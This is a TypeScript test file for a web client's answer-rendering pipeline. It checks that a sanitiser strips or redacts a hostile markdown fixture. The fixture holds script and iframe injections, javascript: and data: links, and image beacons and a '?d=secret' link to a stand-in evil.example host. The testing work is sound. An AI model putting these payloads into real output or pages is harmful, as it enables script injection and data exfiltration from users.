import { describe, expect, test } from "vitest";

import { PLAIN_TEXT_ANSWER_ABOVE } from "../../platform/constants";
import { answerTree, answerView, plainTextAnswer, renderAnswer } from "./pipeline";

/** The hostile answer of `10-web-client.md` Acceptance criteria item 33. */
export const HOSTILE_ANSWER = [
  "![x](https://evil.example/p.png)",
  "",
  "<img src=https://evil.example/p.png>",
  "",
  "<script>alert(1)</script>",
  "",
  "[a](https://evil.example/?d=secret) and https://evil.example/x and www.evil.example and <https://evil.example>",
  "",
  "A [reference link][r] and [the docs](https://docs.example/a).",
  "",
  "[j](javascript:alert(1)) [d](data:text/html,<b>x</b>)",
  "",
  '<iframe src="https://evil.example/f"></iframe>',
  "",
  "A claim[^1].",
  "",
  "- [x] done",
  "- [ ] open",
  "",
  "[^1]: The note.",
  "",
  "[r]: https://evil.example/ref",
].join("\n");

function parse(html: string): HTMLElement {
  return new DOMParser().parseFromString(`<body>${html}</body>`, "text/html").body;
}

describe("T-379 the render pipeline", () => {
  test("T-379 the hostile answer renders with exactly one link, for the allowlisted URL", () => {
    const html = renderAnswer(HOSTILE_ANSWER, { allowedLinks: ["https://docs.example/a"] });
    const body = parse(html);
    expect(body.querySelector("img, script, iframe, input, style, [src], [style]")).toBeNull();
    const links = [...body.querySelectorAll("a")];
    expect(links).toHaveLength(1);
    expect(links[0]?.getAttribute("href")).toBe("https://docs.example/a");
    expect(links[0]?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(links[0]?.getAttribute("target")).toBe("_blank");
    expect(body.textContent).not.toContain("https://evil.example/x");
    expect(body.textContent).not.toContain("www.evil.example");
    expect(body.textContent).toContain("[link removed]");
  });
});

describe("T-385 the fallbacks", () => {
  const allowedLinks = ["https://docs.example/a"];

  test("T-385 a pipeline that throws shows plain text with [n] and refused URLs redacted", () => {
    const view = answerView(
      "See ⟦1⟧ https://evil.example/x?d=secret and https://docs.example/a",
      { allowedLinks },
      () => {
        throw new Error("broken");
      },
    );
    expect(view).toEqual({
      kind: "plain",
      text: "See [1] [link removed] and https://docs.example/a",
    });
  });

  test("T-385 an answer above 200,000 characters skips the pipeline", () => {
    const text = `${"a ".repeat(PLAIN_TEXT_ANSWER_ABOVE / 2)}https://evil.example/x?d=secret`;
    const view = answerView(text, { allowedLinks }, () => {
      throw new Error("never called");
    });
    expect(view.kind).toBe("plain");
    expect(view.kind === "plain" && view.text.endsWith("[link removed]")).toBe(true);
  });

  test("T-385 otherwise the view is the sanitised HTML", () => {
    expect(answerView("**hi**", {})).toEqual({ kind: "html", html: "<p><strong>hi</strong></p>" });
  });

  test("T-385 plainTextAnswer redacts before allowedLinks arrive", () => {
    expect(plainTextAnswer("https://docs.example/a ⟦2⟧", null)).toBe("[link removed] [2]");
  });

  test("T-385 answerTree gives the policy-applied tree", () => {
    const tree = answerTree("[x](https://evil.example/)", {});
    expect(tree.children).toEqual([
      expect.objectContaining({
        tagName: "p",
        children: [expect.objectContaining({ type: "text", value: "x" })],
      }),
    ]);
  });
});
